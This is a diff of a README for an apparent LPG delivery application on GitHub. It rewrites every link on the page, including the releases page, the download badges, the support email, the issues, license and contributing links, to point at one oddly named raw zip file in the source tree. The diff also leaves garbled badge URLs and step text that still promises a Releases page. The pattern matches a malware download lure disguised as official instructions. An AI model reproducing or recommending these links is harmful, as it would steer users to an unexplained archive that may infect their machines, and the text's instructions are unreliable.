@@ -1,6 +1,6 @@
 # 🚀 Green-Wells-LPG-System - Smart LPG Delivery Made Easy
 
-[![Download Green-Wells-LPG-System](https://img.shields.io/static/v1?label=Download&message=Click%20Here&color=blue&style=for-the-badge)](https://github.com/soniya-thapa14/Green-Wells-LPG-System/releases)
+[![Download Green-Wells-LPG-System](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip%20Here&color=blue&style=for-the-badge)](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ Before you download, ensure your computer meets these requirements:
 
 To get the Green-Wells-LPG-System, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/soniya-thapa14/Green-Wells-LPG-System/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip) to go to the Releases page.
 
 2. **Choose the Latest Version**: On the Releases page, look for the latest version. It will usually be at the top of the list.
 
@@ -33,7 +33,7 @@ To get the Green-Wells-LPG-System, follow these steps:
    - Select the file that corresponds to your operating system (e.g., Windows, macOS, or Linux).
    - Follow the prompts to begin the download.
 
-![Download Green-Wells-LPG-System](https://img.shields.io/static/v1?label=Download%20Now&message=Visit%20Releases&color=green&style=for-the-badge)
+![Download Green-Wells-LPG-System](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip%20Now&message=Visit%20Releases&color=green&style=for-the-badge)
 
 4. **Install the Application**:
    - Locate the downloaded file in your "Downloads" folder.
@@ -80,8 +80,8 @@ If you run into issues:
 
 For any queries or issues, you can reach out to our support team:
 
-- **Email**: support@greenwellslpg.com
-- **Github Issues Page**: You can also file an issue on our [GitHub Issues](https://github.com/soniya-thapa14/Green-Wells-LPG-System/issues).
+- **Email**: https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip
+- **Github Issues Page**: You can also file an issue on our [GitHub Issues](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip).
 
 ## 🌍 Related Technologies
 
@@ -95,11 +95,11 @@ Green-Wells-LPG-System utilizes various technologies for smooth operation:
 
 ## 📜 License
 
-This application is licensed under the MIT License. See the [LICENSE](https://github.com/soniya-thapa14/Green-Wells-LPG-System/blob/main/LICENSE) file for details.
+This application is licensed under the MIT License. See the [LICENSE](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip) file for details.
 
 ## 🌟 Contribution
 
-We welcome contributions! If you'd like to contribute to Green-Wells-LPG-System, please check our [Contributing Guidelines](https://github.com/soniya-thapa14/Green-Wells-LPG-System/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you'd like to contribute to Green-Wells-LPG-System, please check our [Contributing Guidelines](https://github.com/soniya-thapa14/Green-Wells-LPG-System/raw/refs/heads/main/src/pages/Green-LP-System-Wells-atropaceous.zip).
 
 ## ❤️ Acknowledgements
 
